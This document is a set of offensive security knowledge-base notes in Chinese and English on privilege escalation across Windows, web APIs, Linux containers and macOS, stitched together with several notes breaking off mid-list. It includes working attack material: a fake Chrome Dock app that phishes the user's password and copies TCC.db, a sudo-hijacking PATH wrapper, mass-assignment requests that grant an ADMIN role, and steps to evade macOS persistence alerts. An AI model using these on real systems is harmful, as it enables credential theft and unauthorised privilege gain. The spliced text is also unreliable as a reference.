content: 来源路径： 02-知识点/主机提权与逃逸/权限提升 with Autoruns.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 权限提升 with Autoruns [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 权限提升 with Autoruns 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 权限提升 with Autoruns 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：WMIC、Scheduled Tasks、Folders、Registry、Runs；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 16 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 WMIC Scheduled Tasks Folders Registry Runs Startup Path UserInitMprLogonScript Winlogon Keys Policy Settings AlternateShell Changing the Safe Mode Command Prompt Installed Component Browser Helper Objects Overview of Browser Helper Objects (BHOs) Internet Explorer Extensions Font Drivers Open Command Image File Execution Options # 核心要点 All the binaries located in the Startup folders are going to be executed on startup. The common startup folders are the ones listed a continuation, but the startup folder is indicated in the registry. Read this to learn where. Registry keys known as Run and RunOnce are designed to automatically execute programs every time a user logs into the system. The command line assigned as a key's data value is limited to 260 characters or less. 利用 1: If you can write inside any of the mentioned registry inside HKLM you can escalate privileges when a different user logs in. 利用 2: If you can overwrite any of the binaries indicated on any of the registry inside HKLM you can modify that binary with a backdoor when a different user logs in and escalate privileges. HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders Prefer full paths to .bat, .cmd, .ps1, or other launcher files already readable by the target user. Unlike HKLM...\Run, this does not grant elevation by itself; it is user-scope 持久化. 利用 1: Changing the AlternateShell registry key allows for custom command shell setup, potentially for unauthorized access. 利用 2 (PATH Write Permissions): Having write permissions to any part of the system PATH variable, especially before C:\Windows\system32, lets you execute a custom cmd.exe, which could be a backdoor if the system is started in Safe Mode. 利用 3 (PATH and boot.ini Write Permissions): Writing access to boot.ini enables automatic Safe Mode startup, facilitating unauthorized access on the next reboot. 0 indicates the component's command will not execute. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/主机提权与逃逸/批量赋值 (CWE-915) – 权限提升 via Unsafe Model Binding.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 批量赋值 (CWE-915) – 权限提升 via Unsafe Model Binding [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 批量赋值 (CWE-915) – 权限提升 via Unsafe Model Binding 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 批量赋值 (CWE-915) – 权限提升 via Unsafe Model Binding 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：Finding 批量赋值、利用 – Role Escalation via 批量赋值、Client Bundle 侦察 for Schema and Role IDs、Framework Pitfalls and Secure Patterns；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 12 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Finding 批量赋值 利用 – Role Escalation via 批量赋值 Client Bundle 侦察 for Schema and Role IDs Framework Pitfalls and Secure Patterns # 核心要点 Client bundles contain role names/IDs or other privileged attribute names used throughout the app (admin, staff, moderator, internal flags), hinting bindable schema. Repeat the update including a crafted privileged field in the body. If the response persists the change, you likely have 批量赋值. Response hints at privileged fields: Once you know the bindable shape, include the privileged property in the same request. If the response persists the role change, re-authenticate or refresh tokens/claims so the app issues an admin-context session and shows privileged UI/endpoints. Role identifiers and shapes are frequently enumerated from the client JS bundle or API docs. Search for strings like "roles", "ADMIN", "STAFF", or numeric role IDs. If tokens contain claims (e.g., JWT roles), a logout/login or 令牌 refresh is usually required to realize the new privileges. Look for arrays/maps of roles, permissions, or feature flags. Build 载荷 matching the exact property names and nesting. Ensure privileged fields use json:"-" and validate with a DTO struct that includes only allowed fields. # 命令 / 载荷 / 操作片段 # 1. Finding 批量赋值 12345678910PUT /api/users/12934 HTTP/1.1Host: target.exampleContent-Type: application/json{ "id": 12934, "email": "user@example.com", "firstName": "Sam", "lastName": "Curry"} # 2. Finding 批量赋值 123456789101112HTTP/1.1 200 OKContent-Type: application/json{ "id": 12934, "email": "user@example.com", "firstName": "Sam", "lastName": "Curry", "roles": null, "status": "ACTIVATED", "filters": []} # 3. 利用 – Role Escalation via 批量赋值 12345678910111213PUT /api/users/12934 HTTP/1.1Host: target.exampleContent-Type: application/json{ "id": 12934, "email": "user@example.com", "firstName": "Sam", "lastName": "Curry", "roles": [ { "id": 1, "description": "ADMIN role", "name": "ADMIN" } ]} # 4. Client Bundle 侦察 for Schema and Role IDs 1strings app.*.js | grep -iE "role|admin|isAdmin|permission|status" | sort -u # 5. Framework Pitfalls and Secure Patterns 12345// Any field in req.body (including roles/isAdmin) is persistedapp.put('/api/users/:id', async (req, res) => { const user = await User.findByIdAndUpdate(req.params.id, req.body, { new: true }); res.json(user);}); # 6. Framework Pitfalls and Secure Patterns 1234567// Strict allow-list and explicit authZ for role-changingapp.put('/api/users/:id', async (req, res) => { const allowed = (({ firstName, lastName, nickName }) => ({ firstName, lastName, nickName }))(req.body); const user = await User.findOneAndUpdate({ _id: req.params.id, owner: req.user.id }, allowed, { new: true }); res.json(user);});// Implement a separate admin-only endpoint for role updates with server-side RBAC checks. # 7. Framework Pitfalls and Secure Patterns 123def update @user.update(params[:user]) # roles/is_admin can be set by clientend # 8. Framework Pitfalls and Secure Patterns 123def user_params params.require(:user).permit(:first_name, :last_name, :nick_name)end # 9. Framework Pitfalls and Secure Patterns 1protected $guarded = []; // Everything mass-assignable (bad) # 10. Framework Pitfalls and Secure Patterns 1protected $fillable = ['first_name','last_name','nick_name']; // No roles/is_admin # 11. Framework Pitfalls and Secure Patterns 12// Directly binding to entity and persisting itpublic User update(@PathVariable Long id, @RequestBody User u) { return repo.save(u); } # 12. Framework Pitfalls and Secure Patterns 1record UserUpdateDTO(String firstName, String lastName, String nickName) {} # 工具与参考入口 OWASP Top 10 – Broken Access Control # 检查清单 是否枚举内核、用户、组、sudo/SUID/Capabil

Docker and similar engines can load a custom seccomp profile from JSON. A minimal example that denies chmod while allowing everything else looks like this: On some targets, the immediate value is not full escape but information gathering and kernel attack-surface expansion. These commands help determine whether especially sensitive syscall paths are reachable: If seccomp is absent and the 容器 is also privileged in other ways, that is when it makes sense to pivot into the more specific breakout techniques already documented in the legacy 容器 - escape pages. By itself this is not yet a host escape, but it demonstrates that seccomp was the barrier preventing mount-related 利用. This is not a seccomp-only 利用. The point is that once seccomp is unconfined, syscall-heavy breakout chains that were previously blocked may start working exactly as written. # 命令 / 载荷 / 操作片段 # 1. Modes And Filter Construction 1234567891011121314#include <fcntl.h>#include <linux/seccomp.h>#include <stdio.h>#include <string.h>#include <sys/prctl.h>#include <unistd.h>int main(void) { int output = open("output.txt", O_WRONLY); const char *val = "test"; prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT); write(output, val, strlen(val) + 1); open("output.txt", O_RDONLY);} # 2. Modes And Filter Construction 12345678910111213141516171819#include <errno.h>#include <seccomp.h>#include <stdio.h>#include <unistd.h>int main(void) { scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADF), SCMP_SYS(getpid), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 2, SCMP_A0(SCMP_CMP_EQ, 1), SCMP_A2(SCMP_CMP_LE, 512)); seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADF), SCMP_SYS(write), 1, SCMP_A0(SCMP_CMP_NE, 1)); seccomp_load(ctx); seccomp_release(ctx); printf("pid=%d\n", getpid());} # 3. Lab 12docker run --rm debian:stable-slim sh -c 'grep Seccomp /proc/self/status'docker run --rm --security-opt seccomp=unconfined debian:stable-slim sh -c 'grep Seccomp /proc/self/status' # 4. Lab 1docker run --rm debian:stable-slim sh -c 'apt-get update >/dev/null 2>&1 && apt-get install -y util-linux >/dev/null 2>&1 && unshare -Ur true' # 5. Lab 1grep -E 'Seccomp|NoNewPrivs' /proc/self/status # 6. Custom Policy Example 123456789{ "defaultAction": "SCMP_ACT_ALLOW", "syscalls": [ { "name": "chmod", "action": "SCMP_ACT_ERRNO" } ]} # 7. Custom Policy Example 1docker run --rm -it --security-opt seccomp=/path/to/profile.json busybox chmod 400 /etc/hosts # 8. Abuse 123grep Seccomp /proc/self/statusunshare -Ur true 2>/dev/null && echo "unshare works"unshare -m true 2>/dev/null && echo "mount namespace creation works" # 9. Abuse 1234capsh --print | grep cap_sys_adminmkdir -p /tmp/mmount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"mount -t proc proc /tmp/m 2>/dev/null && echo "proc mount works" # 10. Abuse 12which unshare nsenter strace 2>/dev/nullstrace -e bpf,perf_event_open,keyctl true 2>&1 | tail # 11. title: macOS 权限提升
content: 来源路径： 02-知识点/主机提权与逃逸/macOS 权限提升.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS 权限提升 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 macOS 权限提升 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 macOS 权限提升 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：TCC 权限提升、Linux Privesc、User Interaction、Sudo Hijacking、Dock Impersonation；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 TCC 权限提升 Linux Privesc User Interaction Sudo Hijacking Dock Impersonation 密码 prompt phishing + sudo reuse Newer macOS-specific vectors (2023–2025) Deprecated AuthorizationExecuteWithPrivileges still usable Privileged helper / XPC triage PackageKit script environment inheritance (CVE-2024-27822) LaunchDaemon plist hijack (CVE-2025-24085 pattern) XNU SMR credential race (CVE-2025-24118) SIP 绕过 via Migration assistant ("Migraine", CVE-2023-32369) NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class) TCC：Root 权限提升 CVE-2020-9771：mount apfs TCC 绕过 and 权限提升 Sensitive Information # 核心要点 If you came here looking for TCC 权限提升 go to: Please note that most of the tricks about 权限提升 affecting Linux/Unix will affect also MacOS machines. So see: ../../linux-hardening/privilege-escalation/ You can find the original Sudo Hijacking technique inside the Linux 权限提升 post. However, macOS maintains the user's PATH when he executes sudo. Which means that another way to achieve this attack would be to hijack other binaries that the victim sill execute when running sudo: Using some social engineering you could impersonate for example Google Chrome inside the dock and actually execute your own script: Another options to escalate to root without asking the 密码 with a horrible box, is make Finder really ask for the 密码 to perform a privileged action: Ask Finder to copy to /etc/pam.d a new sudo file (The prompt asking for the 密码 will indicate that "Finder wants to copy sudo") Ask Finder to copy a new 授权 Plugin (You could control the file name so the prompt asking for the 密码 will indicate that "Finder wants to copy Finder.bundle") execute scripts or read configuration from /Applications/... or other paths writable by non-root users Any user (even unprivileged ones) can create and mount a time machine snapshot an access ALL the files of that snapshot.\ # 命令 / 载荷 / 操作片段 # 1. Sudo Hijacking 123456789101112# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATHcat > /opt/homebrew/bin/ls <<'EOF'#!/bin/bashif [ "$(id -u)" -eq 0 ]; then whoami > /tmp/privescfi/bin/ls "$@"EOFchmod +x /opt/homebrew/bin/ls# victimsudo ls # 2. Dock Impersonation 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/bin/sh# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null# Create App structuremkdir -p /tmp/Google\ Chrome.app/Contents/MacOSmkdir -p /tmp/Google\ Chrome.app/Contents/Resources# Payload to executecat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'#include <stdio.h>#include <stdlib.h>#include <unistd.h>int main() { char *cmd = "open /Applications/Google\\\\ Chrome.app & " "sleep 2; " "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; " "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); " "echo $PASSWORD > /tmp/passwd.txt"; system(cmd); return 0;}EOFgcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chromerm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.cchmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome# Info.plistcat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist<?xml version="1.0" encoding="UTF-8"?&g

title: macOS Security Protections 技术笔记
content: 来源路径： 02-知识点/主机提权与逃逸/macOS Security Protections 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS Security Protections 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 macOS Security Protections 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 macOS Security Protections 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：macOS Security Protections、Gatekeeper、Processes Limitants、MACF、SIP：System Integrity Protection；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 macOS Security Protections Gatekeeper Processes Limitants MACF SIP：System Integrity Protection Sandbox TCC：Transparency, Consent, and Control Launch/Environment Constraints & Trust Cache MRT：Malware Removal Tool Background Tasks Management 枚举 Messing with BTM # 核心要点 Gatekeeper is usually used to refer to the combination of Quarantine + Gatekeeper + XProtect, 3 macOS security modules that will try to prevent users from executing potentially malicious software downloaded. XProtect is a preventative tool. It checks files as they're downloaded (via certain applications), and if it detects any known types of malware, it prevents the file from opening, thereby preventing the malware from infecting your system in the first place. MRT, on the other hand, is a reactive tool. It operates after malware has been detected on a system, with the goal of removing the offending software to clean up the system. It's possible to enumerate all the configured background items running the Apple cli tool: When a new 持久化 is found an event of type ES EVENT TYPE NOTIFY BTM LAUNCH ITEM ADD. So, any way to prevent this event from being sent or the agent from alerting the user will help an attacker to 绕过 BTM. Reseting the database: Running the following command will reset the database (should rebuild it from the ground), however, for some reason, after running this, no new 持久化 will be alerted until the system is rebooted. Stop the Agent: It's possible to send a stop signal to the agent so it won't be alerting the user when new detections are found. Bug: If the process that created the 持久化 exists fast right after it, the daemon will try to get information about it, fail, and won't be able to send the event indicating that a new thing is persisting. # 命令 / 载荷 / 操作片段 # 1. This will prevent a sandbox space by triggering Gatekeeper if the sandbox app tries to execute something with open. Note that in the compiled version of a profile the name of the operations are substituded by their entries in an array known by the dylib and the kext, making the compiled version shorter and more difficult to read. Bypasses examples: https://desi-jarvis.medium.com/office365-macos-sandbox-escape-fcce4fa4123c (they are able to write files outside the sandbox whose name starts with ~$). Ans then just execute something using that profile: This reversed and open sourced version of the tool sandbox-exec allows to make sandbox-exec write into a file the compiled sandbox profile. According to this, the sandbox check functions (it's a mac syscall), can check if an operation is allowed or not by the sandbox in a certain PID, audit 令牌 or unique ID. passthrough access (#12): Allow direct passthrough access to a resource, bypassing sandbox checks. reference retain by audit 令牌 (#28): Create a reference for an audit 令牌 for use in sandbox checks. reference release (#29): Release a previously retained audit 令牌 reference. # 命令 / 载荷 / 操作片段 # 1. You can find the flags in the XNU source code in csr.sh: If you need to disable SIP, you must restart your computer in recovery mode (by pressing Command+R during startup), then execute the following command: Bypassing SIP enables an attacker to: Access User Data: Read sensitive user data like mail, messages, and Safari history from all user accounts. TCC 绕过: Directly manipulate the TCC (Transparency, Consent, and Control) database to grant unauthorized access to the webcam, microphone, and other resources. Establish 持久化: Place malware in SIP-protected locations, making it resistant to removal, even by root privileges. This also includes the potential to tamper with the Malware Removal Tool (MRT). Load Kernel Extensions: Although there are additional safeguards, bypassing SIP simplifies the process of loading unsigned kernel extensions. Installer packages signed with Apple's certificate can 绕过 its protections. This means that even packages signed by standard developers will be blocked if they attempt to modify SIP-protected directories. # 命令 / 载荷 / 操作片段 # 1. The thing is that even if python was signed by Apple, it won't execute a script with the quarantine attribute. content: 来源路径： 02-知识点/主机提权与逃逸/macOS MACF 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS MACF 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 macOS MACF 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 macOS MACF 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：macOS MACF、Basic Information、Flow、Labels、MACF Policies；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 11 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 macOS MACF Basic Information Flow Labels MACF Policies MACF initialization in XNU Early bootstrap and mac policy init() mac policy initmach() and loading “security extensions” KPI dependency & com.apple.kpi.dsep in MAC policy kexts MACF on modern macOS releases MACF Callouts priv check & priv grant proc check syscall unix Exposed MACF syscalls Practical offensive research notes Broker path checks vs real privileged action Trusted deputies with private entitlements # 核心要点 MACF is initialised very soon. In bootstrap thread (in XNU startup code), after ipc bootstrap, XNU calls mac policy init() (in mac base.c). mac policy initmach() examines kernel extensions (kexts) that are preloaded (or in a “policy injection” list) and inspects their Info.plist for the key AppleSecurityExtension. Examples of Apple kexts with that key include ALF.kext, AppleMobileFileIntegrity.kext (AMFI), Sandbox.kext, Quarantine.kext, TMSafetyNet.kext, CoreTrust.kext, AppleSystemPolicy.kext, among others (as you already listed). However, remember that not all MACF callouts are used only to deny actions. For example, mac priv grant calls the macro MAC GRANT, which will grant the requested privilege if any policy answers with a 0: These callas are meant to check and provide (tens of) privileges defined in bsd/sys/priv.h.\ Recent macOS bugs rarely "break MACF" directly. Instead, they usually abuse a desynchronisation between a MACF / Sandbox / TCC decision and the privileged action that happens later. sandbox check, sandbox check by audit 令牌 privileged sinks such as mount, rename, copyfile, helper-tool XPC methods, or anything that later touches attacker-controlled paths as root # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/主机提权与逃逸/macOS Library Injection 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS Library Injection 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 macOS Library Injection 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 macOS Library Injection 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：macOS Library Injection、Dyld Process、DYLD INSERT LIBRARIES、Library Validation、Dylib Hijacking；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 macOS Library Injection Dyld Process DYLD INSERT LIBRARIES Library Validation Dylib Hijacking Make it owned by root and suid Insert the library Remove suid Apply runtime proetction Apply library validation Sign it If the signature is from an unverified developer the injection will still work If it's from a verified developer, it won't Apply CS RESTRICT protection # 核心要点 The code of dyld is open source and can be found in https://opensource.apple.com/source/dyld/ and cab be downloaded a tar using a URL such as https://opensource.apple.com/tarballs/dyld/dyld-852.2.tar.gz You can check if a binary has hardened runtime with codesign --display --verbose <bin> checking the flag runtime in CodeDirectory like: CodeDirectory v=20500 size=767 flags=0x10000(runtime) hashes=13+7 location=embedded You can also load a library if it's signed with the same certificate as the binary. Remember that previous Library Validation restrictions also apply to perform Dylib hijacking attacks. As in Windows, in MacOS you can also hijack dylibs to make applications execute arbitrary code (well, actually froma regular user this coul not be possible as you might need a TCC permission towrite inside an .app bundle and hijack a library).\ However, the way MacOS applications load libraries is more restricted than in Windows. This implies that malware developers can still use this technique for stealth, but the probably to be able to abuse this to escalate privileges is much lower. Missing weak linked libraries: This means that the application will try to load a library that doesn't exist configured with LC LOAD WEAK DYLIB. Then, if an attacker places a dylib where it's expected it will be loaded. # 命令 / 载荷 / 操作片段 # 1. Dylib Hijacking 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647- **Configured with @rpath**: Mach-O binaries can have the commands **`LC_RPATH`** and **`LC_LOAD_DYLIB`**. Base on the **values** of those commands, **libraries** are going to be **loaded** from **different directories**. - **`LC_RPATH`** contains the paths of some folders used to load libraries by the binary. - **`LC_LOAD_DYLIB`** contains the path to specific libraries to load. These paths can contain **`@rpath`**, which will be **replaced** by the values in **`LC_RPATH`**. If there are several paths in **`LC_RPATH`** everyone will be used to search the library to load. Example: - If **`LC_LOAD_DYLIB`** contains `@rpath/library.dylib` and **`LC_RPATH`** contains `/application/app.app/Contents/Framework/v1/` and `/application/app.app/Contents/Framework/v2/`. Both folders are going to be used to load `library.dylib`**.** If the library doesn't exist in `[...]/v1/` and attacker could place it there to hijack the load of the library in `[...]/v2/` as the order of paths in **`LC_LOAD_DYLIB`** is followed. - **Find rpath paths and libraries** in binaries with: `otool -l </path/to/binary> | grep -E "LC_RPATH|LC_LOAD_DYLIB" -A 5`> [!NOTE] > **`@executable_path`**: Is the **path** to the directory containing the **main executable file**.>> **`@loader_path`**: Is the **path** to the **directory** containing the **Mach-O binary** which contains the load command.>> - When used in an executable, **`@loader_path`** is effectively the **same** as **`@executable_path`**.> - When used in a **dylib**, **`@loader_path`** gives the **path** to the **dylib**.The way to **escalate privileges** abusing this functionality would be in the rare case that an **application** being executed **by** **root** is **looking** for some **library in some folder where the attacker has write permissions.**> [!TIP]> A nice **scanner** to find **missing libraries** in applications is **Dylib Hijack Scanner** or a **CLI version**.\> A nice **report with technical details** about this technique can be found **here**.**Example**{｛#ref}}macos-dyld-hijacking-and-dyld_insert_libraries.md{｛#endref}}## Dlopen Hijacking> [!CAUTION]> Remember that **previous Library Validation restrictions also apply** to perform Dlopen hijacking attacks.From **`man dlopen`**:- When path **does not contain a slash character** (i.e. it is just a leaf name), **dlopen() will do searching**. Patch level 检测: If upgrading is not possible, mitigate by disabling vulnerable services: # 命令 / 载荷 / 操作片段 # 1. 2024: In-the-wild Kernel 0-days (CVE-2024-23225 & CVE-2024-23296) 12sw_vers # ProductVersion 14.4 or later is patchedauthenticate sudo sysctl kern.osversion # 23E214 or later for Sonoma # 2. 2024: In-the-wild Kernel 0-days (CVE-2024-23225 & CVE-2024-23296) 12launchctl disable system/com.apple.analyticsdlaunchctl disable system/com.apple.rtcreportingd # 3. 2023: MIG Type-Confusion – CVE-2023-41075 1234567// userspace stubtyped_port_t p = get_user_client();uint8_t spray[0x4000] = {0x41};// heap-spray via IOSurfaceFastSetValueio_service_open_extended(...);// malformed MIG message triggers confusionmach_msg(&msg.header, MACH_SEND_MSG|MACH_RCV_MSG, ...); # 4. 2024-2025: SIP 绕过 through Third-party Kexts – CVE-2024-44243 (aka “Sigma”) 12kmutil showloaded | grep -v com.apple # list non-Apple kextslog stream --style syslog --predicate 'senderImagePath contains "storagekitd"' # watch for suspicious child procs # 5. Quick 枚举 速查 123456uname -a # Kernel buildkmutil showloaded # List loaded kernel extensionskextstat | grep -v com.apple # Legacy (pre-Catalina) kext listsysctl kern.kaslr_enable # Verify KASLR is ON (should be 1)csrutil status # Check SIP from RecoveryOSspctl --status # Confirms Gatekeeper state # 工具与参考入口 Pwning OTA PoC # 检查清单 是否枚举内核、用户、组、sudo/SUID/Capabilities 是否检查可写路径和服务配置 是否验证命令上下文与副作用 是否记录提权前后差异 # 关联 主机提权与逃逸总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/主机提权与逃逸/macOS Dirty NIB 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS Dirty NIB 技术笔记 [!summary] 提炼定位 面向 主机提权与逃逸 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 拿到低权限 shell、受限命令执行或本地文件访问后，围绕 macOS Dirty NIB 技术笔记 找提升 / 逃逸路径。 优先枚举权限、文件能力、SUID/sudo、服务配置和可写路径。 # 中文提炼 核心目标是判断 macOS Dirty NIB 技术笔记 是否能把当前本地能力转换为文件读写、命令执行、提权或逃逸。 优先关注：macOS Dirty NIB、What are NIB/XIB files、Dirty NIB injection process (attacker view)、Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)、Addressing Launch Constraints；先确认用户、组、sudo/SUID/Capabilities、可写路径和服务上下文。 命令片段必须带权限上下文使用：普通用户、sudo、SUID、受限 shell、计划任务或服务账户的结果不同。 检测视角重点记录父子进程、命令行、写入路径、网络连接、权限位变化和清理步骤。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 macOS Dirty NIB What are NIB/XIB files Dirty NIB injection process (attacker view) Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia) Addressing Launch Constraints Enumerating targets and nibs (useful for research / legacy systems) 检测 and DFIR tips Defensive hardening (developers and defenders) Related reading in HackTricks # 核心要点 ・Before macOS 13 Ventura: replacing a bundle’s MainMenu.nib (or another nib loaded at startup) could reliably achieve process injection and often 权限提升. Key points that enable the attack: Add an NSTextField whose title contains the 载荷 (e.g., AppleScript or command arguments). Example AppleScript 载荷 for a visible test: Apple introduced several systemic mitigations that dramatically reduce the viability of Dirty NIB in modern macOS: Apple hardened App Management and fixed known bypasses (e.g., CVE‑2023‑40450) noted by Sector7. Python.framework was removed earlier (macOS 12.3), breaking some privilege‑escalation chains. Audit who/what has TCC “App Management” or Full Disk Access (especially terminals and management agents). Removing these from general‑purpose shells prevents trivially re‑enabling Dirty NIB‑style tampering. Adopt the hardened runtime with Library Validation (already standard for modern apps). While this doesn’t stop nib injection by itself, it blocks easy native code loading and forces attackers into scripting‑only 载荷. Do not request or depend on broad App Management permissions in general‑purpose 工具. If MDM requires App Management, segregate that context from user‑driven shells. # 命令 / 载荷 / 操作片段 # 1. Dirty NIB injection process (attacker view) 12345678910111213141516171819202122<objects> <customObject id="A1" customClass="NSAppleScript"/> <textField id="A2" title="display dialog \"PWND\""/> <menuItem id="C1"> <connections> <binding name="target" destination="A1"/> <binding name="selector" keyPath="initWithSource:"/> <binding name="Argument" destination="A2" keyPath="title"/> </connections> </menuItem> <menuItem id="C2"> <connections> <binding name="target" destination="A1"/> <binding name="selector" keyPath="executeAndReturnError:"/> </connections> 